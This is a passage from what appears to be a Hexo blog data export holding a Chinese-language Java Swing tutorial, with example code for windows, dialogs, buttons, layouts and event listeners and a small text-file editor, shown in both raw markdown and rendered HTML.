\"文本文档\", \"txt\");\n                chooser.setFileFilter(filter);\n                int returnVal = chooser.showOpenDialog(jFrame);\n                if(returnVal == JFileChooser.APPROVE_OPTION) {\n                    path=chooser.getSelectedFile().getAbsolutePath();\n                    jTextField.setText(path);\n                }\n            }\n        });\n        JButton Clear=new JButton(\"Clear\");\n        Clear.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                jTextArea.setText(\"\");\n            }\n        });\n        JButton Read=new JButton(\"Read\");\n        Read.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n\n                try{\n                    readText(path,jTextArea);\n                }catch (Exception ex){\n\n                }\n            }\n        });\n        JButton Save=new JButton(\"Save\");\n        Save.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n\n                try{\n                    saveText(path,jTextArea);\n                }catch (Exception ex){\n\n                }\n            }\n        });\n        JButton Exit=new JButton(\"Exit\");\n        Exit.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                System.exit(0);\n            }\n        });\n        //设置滚动条一直显示\n        jScrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);\n        jFrame.add(jLabel);\n        jFrame.add(jTextField);\n        jFrame.add(Browse);\n        jFrame.add(jScrollPane);\n        jFrame.add(Clear);\n        jFrame.add(Read);\n        jFrame.add(Save);\n        jFrame.add(Exit);\n        jFrame.setVisible(true);\n        jFrame.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);\n    }\n}\n\n```\n\n<img src=\"/images/java-ui/image-20211229002852293.png\" alt=\"image-20211229002852293\" style=\"zoom:67%;\" />\n","source":"_posts/java-ui.md","raw":"---\ntitle: java_ui\ndate: 2021-12-27 23:25:13\ntags:\n      - java\n      - UI\ncategories: java\ntypora-root-url: ..\ndescription: java折磨人的ui\n---\n\n#### JFrame\n\nJFrame初体验\n\n```java\nimport javax.swing.*;\npublic class jFrameTest {\n    public static void main(String[] args) {\n        JFrame jf=new JFrame();\n        jf.setSize(400,250);\n        jf.setLocation(400,300);//setLocation设置出现在屏幕中的位置\n        //setBounds()可以一次性完成上面两句\n        jf.setVisible(true);//设置窗口可见\n        jf.setTitle(\"hello\");//设置标题\n        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);//设置点击关闭后关闭\n        /*关闭方式参数\n        DO_NOTHING_ON_CLOSE//什么也不做\n        HIDE_ON_CLOSE//隐藏当前窗口\n        DISPOSE_ON_CLOSE//隐藏当前窗口,并释放窗体占有的其他资源\n        EXIT_ON_CLOSE//结束窗口缩在的应用程序 ...一般选这个...\n    }\n}\n\n```\n\n<img src=\"/images/java-ui/image-20211227233144855.png\" alt=\"image-20211227233144855\" style=\"zoom: 67%;\" />\n\n#### JDialog\n\n继承自java.awt.Dialog类,他是从一个窗体弹出来的另外一个窗体,他和JFrame类似\n\n`JDialog:可当成JFrame使用,但必须从属于JFrame`\n\n构造函数 **一般用第三种**\n\n```java\nJDialog();\nJDialog(Frame f);//指定父窗口\nJDialog(Frame f,String title);//指定父窗口+标题\n```\n\n关闭方式只有三种,一般选第二种\n\nDO_NOTHING_ON_CLOSE//什么也不做\nHIDE_ON_CLOSE//隐藏当前窗口\nDISPOSE_ON_CLOSE//隐藏当前窗口,并释放窗体占有的其他资源\n\n例子\n\n```java\nimport javax.swing.*;\npublic class jFrameTest {\n    public static void main(String[] args) {\n        JFrame jf=new JFrame();\n        jf.setSize(400,250);\n        //setLocation设置出现在屏幕中的位置\n        jf.setLocation(400,300);\n        jf.setVisible(true);//设置窗口可见\n        jf.setTitle(\"hello\");//设置标题\n        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);\n\n        JDialog jd=new JDialog(jf,\"jdialog\");\n        jd.setBounds(500,400,300,300);\n        jd.setVisible(true);\n        jd.setDefaultCloseOperation(WindowConstants.DISPOSE_ON_CLOSE);\n    }\n}\n\n```\n\n\n\n<img src=\"/images/java-ui/image-20211227234154224.png\" alt=\"image-20211227234154224\" style=\"zoom:67%;\" />\n\n关闭JFrame所有窗口都会关闭,关闭JDialogJFrame不受影响\n\n\n\n#### 组件和面板\n\n例子\n\n组件一般添加到Jpanel和JScrollPane再添加到JFrame\n\nJScrollPane是带滚动条的面板,只能添加一个组件,添加多个组件可以先添加到Jpanel再添加到JScrollPane\n\n```java\nimport javax.swing.*;\nimport java.awt.*;\n\npublic class jFrameTest {\n    public static void main(String[] args) {\n        JFrame jf=new JFrame();\n        jf.setBounds(400,300,400,250);\n        jf.setVisible(true);//设置窗口可见\n        jf.setTitle(\"hello\");//设置标题\n        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);\n        JButton jb1=new JButton(\"btn1\");\n        JButton jb2=new JButton(\"btn2\");\n        JPanel jp=new JPanel(new FlowLayout());\n        jp.add(jb1);\n        jp.add(jb2);\n        jf.add(jp);\n\n    }\n}\n\n```\n\n<img src=\"/images/java-ui/image-20211227235300734.png\" alt=\"image-20211227235300734\" style=\"zoom:67%;\" />\n\n##### 标签组件JLabel\n\n和C#中的label一样,类似于只读的文本框\n\nJLabel构造方法\n\n```java\n以下参数都可以省略\nJLabel(String str,Icon icon,int aligment);//设置文本,图标,水平对齐方式\n```\n\n##### 按钮组件JButton\n\nJButton构造方法\n\n```java\n以下参数都可以省略\nJButton(String text,Icon icon)//设置文本,图标\n```\n\n其他JButton类内自带方法\n\n```java\nsetTooltipText(String text)//设置提示文本\nsetBorderPainted();//设置边界是否显示\nsetEnabled();//设置按钮知否可用\n```\n\n##### 单选按钮组件JRadioButton\n\nJRadioButton构造方法\n\n```java\n以下参数都可以省略,一般只用指定文字即可\nJRadioButton(String text,Icon icon,boolean selected)//指定文字,图标,是否选中\n```\n\n例子\n\n```java\nimport javax.swing.*;\nimport java.awt.*;\n\npublic class jFrameTest {\n    public static void main(String[] args) {\n        JFrame jf=new JFrame();\n        jf.setBounds(400,300,400,250);\n        jf.setLayout(new FlowLayout());\n        jf.setTitle(\"hello\");//设置标题\n        JRadioButton jrb1=new JRadioButton(\"男\");\n        JRadioButton jrb2=new JRadioButton(\"女\");\n        ButtonGroup group=new ButtonGroup();\n        group.add(jrb1);\n        group.add(jrb2);\n        jf.add(jrb1);\n        jf.add(jrb2);\n        jf.setVisible(true);\n        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);\n    }\n}\n\n```\n\n<img src=\"/images/java-ui/image-20211228001003287.png\" alt=\"image-20211228001003287\" style=\"zoom:67%;\" />\n\n##### 复选框组件JCheckBox\n\nJCheckBox构造方法\n\n```java\nJCheckBox(Icon icon,boolean checked);//指定图标,是否被选中\nJCheckBox(String text,boolean checked);//指定文字,是否被选中\n```\n\n例子\n\n```java\nimport javax.swing.*;\nimport java.awt.*;\n\npublic class jFrameTest {\n    public static void main(String[] args) {\n        JFrame jf=new JFrame();\n        jf.setBounds(400,300,400,250);\n        jf.setLayout(new FlowLayout());//设置流式布局\n        jf.setTitle(\"hello\");//设置标题\n        JCheckBox jcb1=new JCheckBox(\"摆烂\",true);\n        JCheckBox jcb2=new JCheckBox(\"足球\");\n        JCheckBox jcb3=new JCheckBox(\"音乐\");\n        JCheckBox jcb4=new JCheckBox(\"睡觉\");\n        jf.add(jcb1);\n        jf.add(jcb2);\n        jf.add(jcb3);\n        jf.add(jcb4);\n        \n        jf.setVisible(true);\n        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);\n    }\n}\n\n```\n\n<img src=\"/images/java-ui/image-20211228001621601.png\" alt=\"image-20211228001621601\" style=\"zoom:67%;\" />\n\n##### 下拉列表组件JComboBox\n\nJComboBox构造方法\n\n```java\nJComboBox();//常用\nJComboBox(ComboBoxModel dataModel);//使用listModel建立一个下拉列表\nJComBox(Object[] arrayData);\nJComboBox(Vector vector);\n```\n\n方法\n\n`addItem添加下拉内容`\n\n例子\n\n```java\nimport javax.swing.*;\nimport java.awt.*;\n\npublic class jFrameTest {\n    public static void main(String[] args) {\n        JFrame jf=new JFrame();\n        jf.setBounds(400,300,400,250);\n        jf.setLayout(new FlowLayout());//设置流式布局\n        jf.setTitle(\"hello\");//设置标题\n        JComboBox box=new JComboBox();\n        box.addItem(\"---请选择你的学历---\");\n        box.addItem(\"高中\");\n        box.addItem(\"大学\");\n        box.addItem(\"研究生\");\n        jf.add(box);\n        jf.setVisible(true);\n        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);\n    }\n}\n\n```\n\n<img src=\"/images/java-ui/image-20211228131636660.png\" alt=\"image-20211228131636660\" style=\"zoom:67%;\" />\n\n##### 菜单栏组件\n\nJmenuBar  Jmenu  JmenuItem\n\n```java\nimport javax.swing.*;\nimport java.awt.*;\n\npublic class S9_3 {\n    public static void main(String[] args) {\n        JFrame jFrame=new JFrame(\"记事本\");\n        jFrame.setBounds(500,400,700,700);\n        jFrame.setLayout(new FlowLayout(FlowLayout.LEFT));\n        JMenuBar bar=new JMenuBar();\n        JMenu menu1=new JMenu(\"文件(F)\");\n        JMenuItem item1=new JMenuItem(\"新建\");\n        JMenuItem item2=new JMenuItem(\"保存\");\n        JMenuItem item3=new JMenuItem(\"另存为\");\n        menu1.add(item1);\n        menu1.add(item2);\n        menu1.add(item3);\n        JMenu menu2=new JMenu(\"编辑(E)\");\n        JMenu menu3=new JMenu(\"格式(O)\");\n        JMenu menu4=new JMenu(\"查看(V)\");\n        JMenu menu5=new JMenu(\"帮助(H)\");\n        JMenuItem item4=new JMenuItem(\"查看帮助(H)\");\n        JMenuItem item5=new JMenuItem(\"发送反馈(F)\");\n        JMenuItem item6=new JMenuItem(\"关于记事本(A)\");\n        menu5.add(item4);\n        menu5.add(item5);\n        menu5.add(item6);\n        bar.add(menu1);\n        bar.add(menu2);\n        bar.add(menu3);\n        bar.add(menu4);\n        bar.add(menu5);\n\n\n        jFrame.add(bar);\n        JTextArea jTextArea=new JTextArea(40,63);\n        jFrame.add(jTextArea);\n        jFrame.setVisible(true);\n        jFrame.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);\n    }\n\n}\n```\n\n<img src=\"/images/java-ui/image-20211229002557142.png\" alt=\"image-20211229002557142\" style=\"zoom:67%;\" />\n\n##### 文本组件JTextField\n\n构造方法\n\n```java\n以下参数都可以省略,一般只用指定文字即可\nJTextField(Document docModel,String text,int fieldWidth);//指定文本框,文字,文本框长度\n```\n\n`getText();//获取输入的内容`\n\n##### 密码框组件JPasswordField\n\n构造方法\n\n```java\n以下参数都可以省略,一般只用指定文字即可\nJPasswordField(Document docModel,String text,int fieldWidth);//指定文本框,文字,文本框长度\n```\n\n常用方法\n\n```java\nsetEchoChar('*');//设置回显字符\ngetText();//获取输入的内容\n```\n\n例子\n\n```java\nimport javax.swing.*;\nimport java.awt.*;\n\npublic class jFrameTest {\n    public static void main(String[] args) {\n        JFrame jf=new JFrame();\n        jf.setBounds(400,300,400,250);\n        jf.setLayout(new FlowLayout(FlowLayout.LEFT));//设置流式布局\n        jf.setTitle(\"hello\");//设置标题\n        JLabel jlabel1=new JLabel(\"账号:\");\n        JTextField username=new JTextField(10);\n        jf.add(jlabel1);\n        jf.add(username);\n        JLabel jlabel2=new JLabel(\"密码:\");\n        JPasswordField password=new JPasswordField(10);\n        password.setEchoChar('*');//设置回显字符\n\n        jf.add(jlabel2);\n\n        jf.add(password);\n\n        jf.setVisible(true);\n        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);\n    }\n}\n\n```\n\n<img src=\"/images/java-ui/image-20211228133823317.png\" alt=\"image-20211228133823317\" style=\"zoom:67%;\" />\n\n##### 文本域组件JTextArea\n\n构造函数\n\n```java\nJTextArea(Document doc,String text,int rows,int cols);//指定文本模型,默认文字,长,宽\n```\n\n常用方法\n\n```java\nsetLineWrap();//设置文本域是否自动换行true or false\ngetText();//获取输入的内容\n```\n\n#### 常用布局\n\n##### 流布局FlowLayout\n\n所有组件像流一样,一个一个排放,排满一行之后排下一行,默认情况下,每个组件是居中排列的,但是也可以设置\n\n构造方法\n\n```java\n//参数都可省略,一般只写对齐方式\nFlowLayout(int aligment,int horizGap,int vertGap);//设置对齐方式,上下偏移\naligment取值:\nFlowLayout.LEFT=0;\nFlowLayout.CENTER=1;\nFlowLayout.RIGHT=2;\n```\n\n##### 边界布局BorderLayout\n\n边界布局是默认的布局管理方式,边界布局将容器分成了东`BorderLayout.NORTH`,南,西,北,中5个区域\n\n在add的时候指定边界\n\n`jf.add(button,BorderLayout.NORTH);`\n\n<img src=\"/images/java-ui/image-20211228135034235.png\" alt=\"image-20211228135034235\" style=\"zoom:67%;\" />\n\n##### 网格布局GridLayout\n\n将容器划分为网格,网格个数由行和列决定,每个组件会填满空格,改变容器大小,组件的大小也会随之改变\n\n构造方法\n\n```java\nGridLayout(int rows,int columns,int horizGap,int vertGap);//指定行数,列数,水平间隔.垂直间隔\n```\n\n例子\n\n```java\nimport javax.swing.*;\nimport java.awt.*;\n\npublic class jFrameTest {\n    public static void main(String[] args) {\n        JFrame jf=new JFrame();\n        jf.setBounds(400,300,400,250);\n        jf.setLayout(new GridLayout(3,3,5,5));//设置网格布局\n        jf.setTitle(\"test\");//设置标题\n        JButton jButton1=new JButton(\"A\");\n        JButton jButton2=new JButton(\"B\");\n        JButton jButton3=new JButton(\"C\");\n        JButton jButton4=new JButton(\"D\");\n        JButton jButton5=new JButton(\"E\");\n        JButton jButton6=new JButton(\"F\");\n        JButton jButton7=new JButton(\"G\");\n        JButton jButton8=new JButton(\"H\");\n        jf.add(jButton1);\n        jf.add(jButton2);\n        jf.add(jButton3);\n        jf.add(jButton4);\n        jf.add(jButton5);\n        jf.add(jButton6);\n        jf.add(jButton7);\n        jf.add(jButton8);\n        jf.setVisible(true);\n        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);\n    }\n}\n\n```\n\n<img src=\"/images/java-ui/image-20211228135556932.png\" alt=\"image-20211228135556932\" style=\"zoom:67%;\" />\n\n#### 常用的事件监听器\n\n一个事件模型中有三个对象:事件源,事件,以及监听程序\n\n##### 事件监听机制\n\n- 事件源    事件发生的地方\n- 事件        要发生的事情\n- 事件处理 针对发生的事情做出的处理方案\n- 事件监听 把事件源和事件关联起来\n\n##### 两种监听器\n\n|                | 事件        | 事件源                     | 监听接口       | 方法                                       |\n| -------------- | ----------- | -------------------------- | -------------- | ------------------------------------------ |\n| 动作事件监听器 | ActionEvent | JButton,JlistmJTextField等 | ActionListener | addActionListener(),removeActionListener() |\n| 焦点事件监听器 | FocusEvent  | Component及其派生          | FocusListener  | addFocusListener(),removeFocusListener()   |\n\n使用步骤\n\n1. 新建一个组件(如Button)\n2. 将该组件添加到相应的面板(如JFrame)\n3. 注册监听器以监听事件源产生的事件(如通过ActionListener来响应用户点击按钮)\n4. 定义处理事件的方法(如在ActionListener中的actionPerformed中定义响应的方法)\n\n**一般用匿名内部类方式实现**\n\n例子\n\n```java\njla.addFocusListener(new FocusListener(){\n    public void focusLost(FocusEvent e){\n        //失去焦点的时候做的事情\n    }\n    public void focusGained(FocusEvent e){\n        //获取焦点的时候做的事情\n    }  \n});\n```\n\n```java\njb.addActionListener(new ActionListener(){\n\t@Override\n    public void actionPerformed(ActionEvent e){\n     //单击鼠标时执行   \n    }\n});\n```\n\n```java\nimport javax.swing.*;\nimport java.awt.*;\nimport java.awt.event.ActionEvent;\n\npublic class jFrameTest {\n    public static void main(String[] args) {\n        JFrame jf=new JFrame();\n        jf.setBounds(400,300,400,250);\n        jf.setLayout(new FlowLayout());//设置网格布局\n        jf.setTitle(\"test\");//设置标题\n        JTextArea jTextArea=new JTextArea();\n        jTextArea.setLineWrap(true);\n        JButton jButton=new JButton(\"希望你对你对人生也是这个态度\");\n        jf.add(jTextArea);\n        jf.add(jButton);\n        jButton.addActionListener(new AbstractAction() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                jTextArea.append(\"啊对对对\");\n            }\n        });\n\n        jf.setVisible(true);\n        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);\n    }\n}\n\n```\n\n<img src=\"/images/java-ui/image-20211228141558056.png\" alt=\"image-20211228141558056\" style=\"zoom:67%;\" />\n\n##### 综合实践\n\n```java\nimport javax.swing.*;\nimport javax.swing.filechooser.FileNameExtensionFilter;\nimport java.awt.*;\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\nimport java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.FileReader;\nimport java.io.FileWriter;\n\npublic class S9_2 {\n    static String path;\n    public static void readText(String path,Object obj) throws Exception{\n        JTextArea jTextArea=(JTextArea) obj;\n        FileReader fileReader=new FileReader(path);\n        BufferedReader bufferedReader=new BufferedReader(fileReader);\n\n        String line;\n        while((line=bufferedReader.readLine())!=null){\n            jTextArea.append(line);\n        }\n        bufferedReader.close();\n        fileReader.close();\n    }\n    public static void saveText(String path,Object obj)throws Exception{\n        JTextArea jTextArea=(JTextArea) obj;\n        BufferedWriter bufferedWriter=new BufferedWriter(new FileWriter(path));\n        bufferedWriter.write(jTextArea.getText());\n        bufferedWriter.flush();\n        bufferedWriter.close();\n    }\n    public static void main(String[] args) {\n        JFrame jFrame=new JFrame(\"S9_2\");\n        jFrame.setLayout(new FlowLayout(FlowLayout.CENTER));\n        jFrame.setBounds(500,500,600,500);\n        JTextArea jTextArea=new JTextArea(20,50);\n        JTextField jTextField=new JTextField(35);\n        //把文本域放进jScrollPane让其拥有滚动条\n        JScrollPane jScrollPane=new JScrollPane(jTextArea);\n        JLabel jLabel=new JLabel(\"File:\");\n        JButton Browse=new JButton(\"Browse\");\n        Browse.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                \n             \t//文件选择组件\n                JFileChooser chooser =new JFileChooser(\"C:/\");\n                FileNameExtensionFilter filter = new FileNameExtensionFilter(\n                        \"文本文档\", \"txt\");\n                chooser.setFileFilter(filter);\n                int returnVal = chooser.showOpenDialog(jFrame);\n                if(returnVal == JFileChooser.APPROVE_OPTION) {\n                    path=chooser.getSelectedFile().getAbsolutePath();\n                    jTextField.setText(path);\n                }\n            }\n        });\n        JButton Clear=new JButton(\"Clear\");\n        Clear.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                jTextArea.setText(\"\");\n            }\n        });\n        JButton Read=new JButton(\"Read\");\n        Read.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n\n                try{\n                    readText(path,jTextArea);\n                }catch (Exception ex){\n\n                }\n            }\n        });\n        JButton Save=new JButton(\"Save\");\n        Save.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n\n                try{\n                    saveText(path,jTextArea);\n                }catch (Exception ex){\n\n                }\n            }\n        });\n        JButton Exit=new JButton(\"Exit\");\n        Exit.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                System.exit(0);\n            }\n        });\n        //设置滚动条一直显示\n        jScrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);\n        jFrame.add(jLabel);\n        jFrame.add(jTextField);\n        jFrame.add(Browse);\n        jFrame.add(jScrollPane);\n        jFrame.add(Clear);\n        jFrame.add(Read);\n        jFrame.add(Save);\n        jFrame.add(Exit);\n        jFrame.setVisible(true);\n        jFrame.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);\n    }\n}\n\n```\n\n<img src=\"/images/java-ui/image-20211229002852293.png\" alt=\"image-20211229002852293\" style=\"zoom:67%;\" />\n","slug":"java-ui","published":1,"updated":"2022-01-07T13:31:06.117Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckyiip9md000wgsw95kzcge30","content":"<h4 id=\"JFrame\"><a href=\"#JFrame\" class=\"headerlink\" title=\"JFrame\"></a>JFrame</h4><p>JFrame初体验</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.swing.*;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">jFrameTest</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        JFrame jf=<span class=\"keyword\">new</span> JFrame();</span><br><span class=\"line\">        jf.setSize(<span class=\"number\">400</span>,<span class=\"number\">250</span>);</span><br><span class=\"line\">        jf.setLocation(<span class=\"number\">400</span>,<span class=\"number\">300</span>);<span class=\"comment\">//setLocation设置出现在屏幕中的位置</span></span><br><span class=\"line\">        <span class=\"comment\">//setBounds()可以一次性完成上面两句</span></span><br><span class=\"line\">        jf.setVisible(<span class=\"keyword\">true</span>);<span class=\"comment\">//设置窗口可见</span></span><br><span class=\"line\">        jf.setTitle(<span class=\"string\">&quot;hello&quot;</span>);<span class=\"comment\">//设置标题</span></span><br><span class=\"line\">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);<span class=\"comment\">//设置点击关闭后关闭</span></span><br><span class=\"line\">        <span class=\"comment\">/*关闭方式参数</span></span><br><span class=\"line\"><span class=\"comment\">        DO_NOTHING_ON_CLOSE//什么也不做</span></span><br><span class=\"line\"><span class=\"comment\">        HIDE_ON_CLOSE//隐藏当前窗口</span></span><br><span class=\"line\"><span class=\"comment\">        DISPOSE_ON_CLOSE//隐藏当前窗口,并释放窗体占有的其他资源</span></span><br><span class=\"line\"><span class=\"comment\">        EXIT_ON_CLOSE//结束窗口缩在的应用程序 ...一般选这个...</span></span><br><span class=\"line\"><span class=\"comment\">    &#125;</span></span><br><span class=\"line\"><span class=\"comment\">&#125;</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br></pre></td></tr></table></figure>\n\n<img src=\"/images/java-ui/image-20211227233144855.png\" alt=\"image-20211227233144855\" style=\"zoom: 67%;\" />\n\n<h4 id=\"JDialog\"><a href=\"#JDialog\" class=\"headerlink\" title=\"JDialog\"></a>JDialog</h4><p>继承自java.awt.Dialog类,他是从一个窗体弹出来的另外一个窗体,他和JFrame类似</p>\n<p><code>JDialog:可当成JFrame使用,但必须从属于JFrame</code></p>\n<p>构造函数 <strong>一般用第三种</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JDialog();</span><br><span class=\"line\">JDialog(Frame f);<span class=\"comment\">//指定父窗口</span></span><br><span class=\"line\">JDialog(Frame f,String title);<span class=\"comment\">//指定父窗口+标题</span></span><br></pre></td></tr></table></figure>\n\n<p>关闭方式只有三种,一般选第二种</p>\n<p>DO_NOTHING_ON_CLOSE//什么也不做<br>HIDE_ON_CLOSE//隐藏当前窗口<br>DISPOSE_ON_CLOSE//隐藏当前窗口,并释放窗体占有的其他资源</p>\n<p>例子</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.swing.*;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">jFrameTest</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        JFrame jf=<span class=\"keyword\">new</span> JFrame();</span><br><span class=\"line\">        jf.setSize(<span class=\"number\">400</span>,<span class=\"number\">250</span>);</span><br><span class=\"line\">        <span class=\"comment\">//setLocation设置出现在屏幕中的位置</span></span><br><span class=\"line\">        jf.setLocation(<span class=\"number\">400</span>,<span class=\"number\">300</span>);</span><br><span class=\"line\">        jf.setVisible(<span class=\"keyword\">true</span>);<span class=\"comment\">//设置窗口可见</span></span><br><span class=\"line\">        jf.setTitle(<span class=\"string\">&quot;hello&quot;</span>);<span class=\"comment\">//设置标题</span></span><br><span class=\"line\">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class=\"line\"></span><br><span class=\"line\">        JDialog jd=<span class=\"keyword\">new</span> JDialog(jf,<span class=\"string\">&quot;jdialog&quot;</span>);</span><br><span class=\"line\">        jd.setBounds(<span class=\"number\">500</span>,<span class=\"number\">400</span>,<span class=\"number\">300</span>,<span class=\"number\">300</span>);</span><br><span class=\"line\">        jd.setVisible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        jd.setDefaultCloseOperation(WindowConstants.DISPOSE_ON_CLOSE);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<img src=\"/images/java-ui/image-20211227234154224.png\" alt=\"image-20211227234154224\" style=\"zoom:67%;\" />\n\n<p>关闭JFrame所有窗口都会关闭,关闭JDialogJFrame不受影响</p>\n<h4 id=\"组件和面板\"><a href=\"#组件和面板\" class=\"headerlink\" title=\"组件和面板\"></a>组件和面板</h4><p>例子</p>\n<p>组件一般添加到Jpanel和JScrollPane再添加到JFrame</p>\n<p>JScrollPane是带滚动条的面板,只能添加一个组件,添加多个组件可以先添加到Jpanel再添加到JScrollPane</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.swing.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.awt.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">jFrameTest</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        JFrame jf=<span class=\"keyword\">new</span> JFrame();</span><br><span class=\"line\">        jf.setBounds(<span class=\"number\">400</span>,<span class=\"number\">300</span>,<span class=\"number\">400</span>,<span class=\"number\">250</span>);</span><br><span class=\"line\">        jf.setVisible(<span class=\"keyword\">true</span>);<span class=\"comment\">//设置窗口可见</span></span><br><span class=\"line\">        jf.setTitle(<span class=\"string\">&quot;hello&quot;</span>);<span class=\"comment\">//设置标题</span></span><br><span class=\"line\">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class=\"line\">        JButton jb1=<span class=\"keyword\">new</span> JButton(<span class=\"string\">&quot;btn1&quot;</span>);</span><br><span class=\"line\">        JButton jb2=<span class=\"keyword\">new</span> JButton(<span class=\"string\">&quot;btn2&quot;</span>);</span><br><span class=\"line\">        JPanel jp=<span class=\"keyword\">new</span> JPanel(<span class=\"keyword\">new</span> FlowLayout());</span><br><span class=\"line\">        jp.add(jb1);</span><br><span class=\"line\">        jp.add(jb2);</span><br><span class=\"line\">        jf.add(jp);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<img src=\"/images/java-ui/image-20211227235300734.png\" alt=\"image-20211227235300734\" style=\"zoom:67%;\" />\n\n<h5 id=\"标签组件JLabel\"><a href=\"#标签组件JLabel\" class=\"headerlink\" title=\"标签组件JLabel\"></a>标签组件JLabel</h5><p>和C#中的label一样,类似于只读的文本框</p>\n<p>JLabel构造方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">以下参数都可以省略</span><br><span class=\"line\">JLabel(String str,Icon icon,<span class=\"keyword\">int</span> aligment);<span 